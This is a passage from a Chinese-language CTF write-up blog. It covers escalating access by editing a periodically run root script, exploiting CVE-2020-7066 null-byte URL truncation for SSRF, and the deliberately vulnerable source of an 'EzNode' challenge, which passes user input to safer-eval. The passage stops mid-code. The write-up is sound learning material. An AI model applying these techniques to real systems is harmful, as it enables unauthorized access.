&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051541059.png&#34; alt=&#34;image-20230405154104996&#34; /&gt;&lt;/p&gt;
&lt;p&gt;用蚂蚁剑连接上后确实访问不了这个 root 目录&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5C%E9%99%8C%E8%B7%AF%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230405154225020.png&#34; alt=&#34;image-20230405154225020&#34; /&gt;&lt;/p&gt;
&lt;p&gt;看到根目录还有一个 hint&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051543047.png&#34; alt=&#34;image-20230405154340012&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1hdXRvLXBtOWZsOGZveDNoLnNo&#34;&gt;又看到 auto.sh&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051544829.png&#34; alt=&#34;image-20230405154429791&#34; /&gt;&lt;/p&gt;
&lt;p&gt;没 60 秒刷新一次，那修改一下这个脚本就可以了&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051548419.png&#34; alt=&#34;image-20230405154814376&#34; /&gt;&lt;/p&gt;
&lt;p&gt;然后去读 flag.hint 就可以了&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051549681.png&#34; alt=&#34;image-20230405154912635&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;cve版签到&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cve版签到&#34;&gt;#&lt;/a&gt; cve 版签到&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051554551.png&#34; alt=&#34;image-20230405155402510&#34; /&gt;&lt;/p&gt;
&lt;p&gt;cve 编号有了，看来简单复现一下就行 [&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vS3kxMjI2L3AvMTQzMzIxMTAuaHRtbA==&#34;&gt;代码审计] CVE-2020-7066 漏洞复现 - Ky1226 - 博客园 (cnblogs.com)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;简答来说 get_headers () 会截断 URL 中空字符后的内容&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051558787.png&#34; alt=&#34;image-20230405155808748&#34; /&gt;&lt;/p&gt;
&lt;p&gt;点击后多了一个 url&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051557371.png&#34; alt=&#34;image-20230405155759326&#34; /&gt;&lt;/p&gt;
&lt;p&gt;看起来是 SSRF，通过 %00 截断然后访问本地 ip&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051608881.png&#34; alt=&#34;image-20230405160815831&#34; /&gt;&lt;/p&gt;
&lt;p&gt;要以 123 结尾&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051608003.png&#34; alt=&#34;image-20230405160845950&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;ez三剑客-eznode&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ez三剑客-eznode&#34;&gt;#&lt;/a&gt; EZ 三剑客 - EzNode&lt;/h3&gt;
&lt;p&gt;看到首页&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051614492.png&#34; alt=&#34;image-20230405161417448&#34; /&gt;&lt;/p&gt;
&lt;p&gt;版本&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;&amp;#123;
  &amp;quot;name&amp;quot;: &amp;quot;src&amp;quot;,
  &amp;quot;version&amp;quot;: &amp;quot;1.0.0&amp;quot;,
  &amp;quot;main&amp;quot;: &amp;quot;index.js&amp;quot;,
  &amp;quot;license&amp;quot;: &amp;quot;MIT&amp;quot;,
  &amp;quot;dependencies&amp;quot;: &amp;#123;
    &amp;quot;body-parser&amp;quot;: &amp;quot;1.19.0&amp;quot;,
    &amp;quot;express&amp;quot;: &amp;quot;4.17.1&amp;quot;,
    &amp;quot;safer-eval&amp;quot;: &amp;quot;1.3.6&amp;quot;
  &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;源码&lt;/p&gt;
&lt;figure class=&#34;highlight js&#34;&gt;&lt;figcaption data-lang=&#34;JavaScript&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; express &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;express&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; bodyParser &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;body-parser&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; saferEval &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;safer-eval&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 2019.7/WORKER1 找到一个很棒的库&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; fs &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;fs&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; app &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;express&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;app&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;use&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;bodyParser&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;urlencoded&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt; &lt;span class=&#34;token literal-property property&#34;&gt;extended&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;false&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;app&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;use&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;bodyParser&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;json&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 2020.1/WORKER2 老板说为了后期方便优化&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;app&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;use&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token parameter&#34;&gt;req&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; res&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; next&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&gt;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;req&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;path &lt;span class=&#34;token operator&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;/eval&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;let&lt;/span&gt; delay &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;60&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1000&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    console&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;delay&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Number&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;isInteger&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;parseInt&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;req&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;query&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;delay&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      delay &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; Math&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;max&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;delay&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;parseInt&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;req&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;query&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;delay&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; t &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;setTimeout&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&gt;&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; delay&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;// 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我 p 事&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function&#34;&gt;setTimeout&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&gt;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token function&#34;&gt;clearTimeout&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;t&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      console&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;timeout&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token keyword&#34;&gt;try&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        res&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Timeout!&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;catch&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;e&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1000&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;app&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;post&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;/eval&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token parameter&#34;&gt;req&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; res&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;let&lt;/span&gt; response &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;req&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;body&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;e&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;41&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;try&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;42&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      response &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;saferEval&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;req&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;body&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;e&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;43&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;catch&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;e&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;44&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      response &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Wrong Wrong Wrong!!!!&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;45&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;46&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;47&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  res&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;response&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td 